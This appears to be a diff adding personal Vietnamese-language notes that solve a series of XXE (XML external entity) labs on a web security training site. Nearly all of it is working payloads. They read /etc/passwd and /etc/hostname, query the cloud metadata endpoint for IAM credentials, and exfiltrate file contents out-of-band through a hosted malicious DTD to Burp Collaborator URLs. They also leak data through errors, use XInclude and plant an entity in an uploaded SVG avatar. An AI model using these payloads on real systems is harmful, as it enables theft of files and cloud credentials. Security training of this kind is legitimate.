@@ -1,0 +1,117 @@
+$Qp*K5g96ip=?@3YgH8+3rc}gD7d-!E5
+1: 
+ Thêm phần sau vào giữa element đầu tiên của xml:
+ <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<stockCheck>
+<productId>&xxe;</productId><storeId>&xxe;</storeId></stockCheck>
+
+2: <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
+
+Bắt đầu với "http://169.254.169.254/" và đổi productId thành &xxe; rồi lần lượt tìm ra các thư mục con ở địa chỉ và thêm vào path của url
+
+3: <!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://3im8djlhivnyaa27u7809djswj2aq3es.oastify.com"> ]> đổi productId thành &xxe;
+
+4: <!DOCTYPE stockCheck [ <!ENTITY % xxe SYSTEM "http://3uy8pjxhuvzymae767k0ldvs8jea25qu.oastify.com"> ]> đổi productId thành %xxe;
+
+5: (XEM SOLUTION) Ở Exploit Server, tạo 1 file '/malicious.dtd' có nội dung như sau(Element thứ 2 giúp gửi req đến Burpsuite Collaborator với là nội dung của file - flag của bài):
+
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://wmm1hcpamorre360y0ctd6nl0c63u1iq.oastify.com/?x=%file;'>">
+%eval;
+%exfil;
+
+để 
+
+Ở req POST /stock/stockCheck ta thêm ở giữa 2 element đầu tiên: 
+
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://exploit-0a1b008f03fbcb90c00b124501350036.exploit-server.net/malicious.dtd"> %xxe;]>
+
+sau đó gửi req và ở Burpsuite Collaborator sẽ có một protocal DNS và  HTTP trong payload của HTTP có GET /x=??????? copy đoạn ?????? để submit flag
+
+6: Ở exploit sever làm giống như câu 5 với payload:
+
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+%eval;
+%error;
+
+Thêm element sau giữa 2 element đầu:
+
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://exploit-0a6c001c0355607bc2eca1ea011c00ea.exploit-server.net/malicious.dtd"> %xxe; %eval; %error;]
+
+
+7: Chuyển ProductID từ 1 thành "<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+<xi:include parse="text" href="file:///etc/passwd"/></foo>" (không có dấu ")
+
+8: POST REQ:
+
+POST /post/comment HTTP/1.1
+Host: 0a7700d8035414aec2a38a6b002700b0.web-security-academy.net
+Cookie: session=QlrpCoK3gxtuZdxMIewQTDssU8e0G9DC
+Content-Length: 2363
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Chromium";v="107", "Not=A?Brand";v="24"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Upgrade-Insecure-Requests: 1
+Origin: https://0a7700d8035414aec2a38a6b002700b0.web-security-academy.net
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryePnCSAsQsKczeQWw
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.88 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0a7700d8035414aec2a38a6b002700b0.web-security-academy.net/post?postId=5
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+------WebKitFormBoundaryePnCSAsQsKczeQWw
+Content-Disposition: form-data; name="csrf"
+
+f8Fb8IGUdI8nTGSzqHReLWIkpTfgBf2J
+------WebKitFormBoundaryePnCSAsQsKczeQWw
+Content-Disposition: form-data; name="postId"
+
+5
+------WebKitFormBoundaryePnCSAsQsKczeQWw
+Content-Disposition: form-data; name="comment"
+
+a
+------WebKitFormBoundaryePnCSAsQsKczeQWw
+Content-Disposition: form-data; name="name"
+
+a
+------WebKitFormBoundaryePnCSAsQsKczeQWw
+Content-Disposition: form-data; name="avatar"; filename="Tree.svg"
+Content-Type: image/svg+xml
+
+<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="3000" height="3000" viewBox="0,0,90.35988,180.80272"><g transform="translate(-191.12069,-95.7086)"><g data-paper-data="{&quot;isPaintingLayer&quot;:true}" fill-rule="nonzero" stroke="none" stroke-width="0.81451" stroke-linecap="butt" stroke-linejoin="miter" stroke-miterlimit="10" stroke-dasharray="" stroke-dashoffset="0" style="mix-blend-mode: normal"><path d="M235.74346,201.94337c3.55106,3.55035 20.43943,-9.93098 11.31671,9.46922c-9.12272,19.40021 -5.31193,65.01379 -5.31193,65.01379c0,0 -0.0939,0.03131 -0.27722,0.08493c-3.76583,-0.06884 -7.53405,-0.08304 -11.29871,-0.18033c-0.83903,-0.02168 -1.68141,-0.13687 -2.5272,-0.2843c-6.47538,-35.49641 5.82895,-73.29071 8.09834,-74.10332z" fill="#854007"/><path d="M193.0356,133.8275c2.7693,-25.9013 23.7021,-38.1189 45.2866,-38.1189c23.3763,0 40.9696,17.9191 42.5172,38.8519c0.8145,10.7515 1.5475,46.5898 -2.4435,62.717c-3.9911,16.1272 -17.349,34.2093 -41.0512,35.1052c-38.5261,1.4662 -44.5534,-28.5891 -45.7752,-41.6212c-0.4887,-5.05 -1.1403,-32.6617 1.4661,-56.934z" fill="#20a600"/><path d="M279.6991,189.7026c-0.4073,2.8508 -0.8145,5.4572 -1.3847,7.6564c-3.9911,16.1272 -17.349,34.2092 -41.0511,35.1052c-37.8745,1.3847 -44.3091,-27.6932 -45.6938,-41.0511c10.67,11.7289 26.0642,19.1409 43.3317,19.1409c18.0821,0 34.2093,-8.1451 44.7979,-20.8514z" fill="#1c9400"/></g></g><text font-size="16" x="0" y="16">&xxe;</text></svg>
+------WebKitFormBoundaryePnCSAsQsKczeQWw
+Content-Disposition: form-data; name="email"
+
+a@a
+------WebKitFormBoundaryePnCSAsQsKczeQWw
+Content-Disposition: form-data; name="website"
+
+
+------WebKitFormBoundaryePnCSAsQsKczeQWw--
+
+
+Mục tiêu: In ra dữ liệu file ở ngay trên ảnh avatar, khi hiện ảnh ta chỉ cần nhìn và nhập lại thông tin
+
+9: (XEM SOLUTION)
+
+<!DOCTYPE message [
+<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+<!ENTITY % ISOamso '
+<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+&#x25;eval;
+&#x25;error;
+'>
+%local_dtd;
+]>
+
